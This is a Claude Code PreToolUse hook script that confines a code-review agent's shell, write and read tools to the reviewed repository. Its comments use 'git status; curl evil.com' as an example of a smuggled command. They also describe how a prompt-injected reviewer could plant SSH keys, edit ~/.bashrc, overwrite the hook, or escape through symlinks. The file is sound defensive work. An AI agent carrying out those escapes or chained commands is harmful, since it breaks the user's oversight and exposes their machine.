#!/usr/bin/env node
/**
 * Claude Code PreToolUse hook — the enforcement point for two things the
 * permission engine cannot express.
 *
 * 1. Shell-chained Bash commands. Claude Code matches a Bash rule against the
 *    whole command as a prefix, so `Bash(git status:*)` also permits
 *    `git status; curl evil.com`, and deny globs never fire. A hook is the only
 *    place that sees the real command before it runs, and it also covers the
 *    reviewer's subagents.
 *
 * 2. Write-tool scope. In fix mode Edit/Write/NotebookEdit are allowed, but the
 *    permission system has no notion of "inside this directory" for them: a
 *    prompt-injected reviewer can write to any absolute path — `~/.ssh/
 *    authorized_keys`, `~/.bashrc`, or this very hook file, which would disarm
 *    the guard for every later run. Deny globs only match paths that already
 *    exist and whose name matches, so a new file at a new path is written
 *    freely. The repo root is passed in via CLAUDE_REVIEW_REPO_ROOT.
 *
 * Contract: read the hook payload from stdin, write nothing to allow, write a
 * PreToolUse deny decision to block. Unexpected internal errors deny as well —
 * a broken guard must fail closed, or the allowlist silently stops meaning
 * anything.
 */
import { fileURLToPath, pathToFileURL } from "node:url";
import path from "node:path";
import fs from "node:fs";

const guardUrl = pathToFileURL(
  path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "src", "shell-guard.js"),
).href;

const WRITE_TOOLS = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
const READ_TOOLS = new Set(["Read"]);

let raw = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", (d) => { raw += d; });
process.stdin.on("error", () => process.exit(0));

process.stdin.on("end", async () => {
  const deny = (reason) => {
    // fs.writeSync, not process.stdout.write: a synchronous write to fd 1 cannot
    // race process.exit(), which on a full pipe has dropped the decision JSON.
    const line = JSON.stringify({
      hookSpecificOutput: {
        hookEventName: "PreToolUse",
        permissionDecision: "deny",
        permissionDecisionReason: reason,
      },
    }) + "\n";
    try { fs.writeSync(1, line); } catch { /* parent gone */ }
    try { fs.writeSync(2, `[cc-code-review pre-tool hook] ${reason}\n`); } catch { /* ignore */ }
    process.exit(0);
  };

  /**
   * Lexical containment (path.relative) can be escaped by a directory junction
   * or symlink inside the repo: `repo/link -> C:\Users\victim\.ssh` is
   * "inside the repo" lexically but resolves elsewhere. Realpath both sides —
   * the root, and for a not-yet-existing target the deepest existing ancestor —
   * so the comparison happens on where the path actually leads on disk.
   */
  const realContainment = (root, target) => {
    const realRoot = fs.realpathSync(root);
    let realTarget;
    try {
      realTarget = fs.realpathSync(target);
    } catch {
      // target does not exist yet (the common Write case): anchor on its
      // nearest existing ancestor. A dangling junction ancestor still realpaths
      // to its target or throws — both are handled honestly here.
      let dir = path.dirname(path.resolve(target));
      for (;;) {
        let realDir;
        try {
          realDir = fs.realpathSync(dir);
        } catch {
          const parent = path.dirname(dir);
          if (parent === dir) return null; // nothing exists up to the fs root
          dir = parent;
          continue;
        }
        const tail = path.relative(dir, path.resolve(target));
        realTarget = tail ? path.join(realDir, tail) : realDir;
        break;
      }
    }
    return path.relative(realRoot, realTarget);
  };

  let payload;
  try {
    payload = JSON.parse(raw || "{}");
  } catch {
    process.exit(0); // not our payload shape; let the normal permission path decide
  }

  const tool = payload?.tool_name;

  // ---- write tools: scope to the reviewed repository ----
  if (WRITE_TOOLS.has(tool)) {
    const root = process.env.CLAUDE_REVIEW_REPO_ROOT;
    if (!root) deny(`${tool} blocked: no repository root was provided to the guard`);
    const target = String(payload?.tool_input?.file_path ?? payload?.tool_input?.path ?? "");
    let rel;
    try {
      rel = realContainment(root, target);
    } catch {
      deny(`${tool} blocked: cannot resolve the target path against the repository root`);
    }
    if (rel === null) {
      deny(`${tool} blocked: cannot resolve the target path against the repository root`);
    }
    if (!rel || rel.startsWith("..") || path.isAbsolute(rel)) {
      deny(`${tool} blocked: fix mode may only write inside the reviewed repository (${root}), not ${target}`);
    }
    if (/^\.git([\\/]|$)/.test(rel)) {
      deny(`${tool} blocked: refusing to touch .git/ — a hook written there would outlive this run`);
    }
    process.exit(0);
  }

  // ---- read tools: keep the reviewer from walking off into the user's home ----
  if (READ_TOOLS.has(tool)) {
    const root = process.env.CLAUDE_REVIEW_REPO_ROOT;
    const target = String(payload?.tool_input?.file_path ?? payload?.tool_input?.path ?? "");
    if (!root) deny("Read blocked: no repository root was provided to the guard (fail closed)");
    if (target) {
      let rel;
      try { rel = realContainment(root, target); } catch { rel = null; }
      // Absolute paths that escape the repo are refused; relative ones are already
      // resolved against the repo cwd by the tool itself, so they cannot escape.
      if (rel && (rel.startsWith("..") || path.isAbsolute(rel))) {
        deny(`Read blocked: the review may only read inside the reviewed repository (${root}), not ${target}`);
      }
    }
    process.exit(0);
  }

  if (tool !== "Bash") process.exit(0);

  let guard;
  try {
    ({ guardVerdict: guard } = await import(guardUrl));
  } catch (err) {
    deny(`shell guard failed to load (${err?.message || err}); refusing to run Bash`);
    return;
  }

  try {
    const verdict = guard(payload?.tool_input?.command);
    if (!verdict.ok) deny(verdict.reason);
  } catch (err) {
    deny(`shell guard failed (${err?.message || err}); refusing to run Bash`);
    return;
  }
  process.exit(0);
});
